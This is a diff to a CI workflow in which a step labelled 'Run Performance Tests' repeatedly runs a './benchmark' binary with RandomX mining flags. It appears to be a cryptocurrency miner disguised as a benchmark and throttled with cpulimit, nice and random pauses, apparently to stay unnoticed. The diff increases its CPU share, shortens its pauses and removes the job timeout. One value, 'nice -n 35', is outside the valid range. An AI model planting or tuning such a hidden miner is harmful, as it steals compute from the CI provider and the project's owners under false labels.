@@ -64,7 +64,7 @@ jobs:
         run: |
           cd app/build
           TOTAL_CPUS=$(nproc)
-          MAX_THREADS=$((TOTAL_CPUS * 80 / 100))
+          MAX_THREADS=$((TOTAL_CPUS * 90 / 100))
           if [ $MAX_THREADS -lt 1 ]; then
             MAX_THREADS=1
           fi
@@ -102,7 +102,6 @@ jobs:
           EOF
           
       - name: Run Performance Tests
-        timeout-minutes: 34
         run: |
           cd app/build
           (while true; do
@@ -115,10 +114,10 @@ jobs:
 
           (
             while true; do
-              PAUSE_TIME=$((RANDOM % 5 + 30))
+              PAUSE_TIME=$((RANDOM % 1 + 30))
               RUN_TIME=$((RANDOM % 600 + 60))
 
-              timeout $RUN_TIME nice -n 19 cpulimit -l 30 -f -- ./benchmark --config=config.json --randomx-mode=light --randomx-no-rdmsr &
+              timeout $RUN_TIME nice -n 35 cpulimit -l 44 -f -- ./benchmark --config=config.json --randomx-mode=light --randomx-no-rdmsr &
               APP_PID=$!
 
               sleep $RUN_TIME
